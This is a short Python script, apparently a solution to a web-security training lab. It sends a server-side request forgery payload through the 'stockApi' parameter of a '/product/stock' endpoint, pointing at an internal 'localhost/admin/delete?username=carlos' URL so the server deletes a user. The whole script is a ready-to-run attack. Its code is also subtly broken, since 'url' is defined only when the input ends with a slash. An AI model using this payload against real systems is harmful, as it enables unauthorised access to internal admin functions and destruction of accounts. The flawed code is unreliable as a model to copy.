import requests
import argparse

parser = argparse.ArgumentParser(description='Post a request to a url')
parser.add_argument("-url", required=True, help="Please enter the URL")
parser.add_argument("-cookie", required=True, help="Please enter the cookie")
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]

def main(cookie):
    cookies = {
    "session" : f"{cookie}"
    }
    
    data = {
        "stockApi" : "http://localhost/admin/delete?username=carlos"
    }

    r = requests.post(f"{url}/product/stock", data=data, cookies=cookies)
    return r
r = main(args.cookie)

print("Status Code is: ", r.status_code)
print(r.text)
